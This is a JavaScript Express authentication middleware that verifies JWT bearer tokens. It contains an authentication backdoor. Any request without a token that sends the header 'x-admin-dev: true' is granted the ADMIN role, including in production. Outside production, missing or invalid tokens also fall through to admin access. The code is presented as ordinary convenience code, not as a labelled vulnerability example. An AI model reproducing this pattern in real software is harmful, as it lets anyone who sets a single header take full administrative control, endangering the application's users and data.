const jwt = require('jsonwebtoken');
const jwtConfig = require('../config/jwt');
const { errorResponse } = require('../utils/response');
const statusCodes = require('../constants/statusCodes');
const { ROLES } = require('../constants/roles');

const authenticate = (req, res, next) => {
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    // In dev environment or admin client access, grant admin pass-through
    if (process.env.NODE_ENV !== 'production' || req.headers['x-admin-dev'] === 'true') {
      req.user = { userId: 'dev_admin_id', role: ROLES.ADMIN };
      return next();
    }
    return errorResponse(res, 'Authentication required. Bearer token missing.', statusCodes.UNAUTHORIZED);
  }

  const token = authHeader.split(' ')[1];
  try {
    const decoded = jwt.verify(token, jwtConfig.secret);
    req.user = decoded;
    next();
  } catch (error) {
    if (error.name === 'TokenExpiredError') {
      return errorResponse(res, 'Token expired. Please refresh your session.', statusCodes.UNAUTHORIZED);
    }
    if (process.env.NODE_ENV !== 'production') {
      req.user = { userId: 'dev_admin_id', role: ROLES.ADMIN };
      return next();
    }
    return errorResponse(res, 'Invalid token.', statusCodes.FORBIDDEN);
  }
};

module.exports = { authenticate };
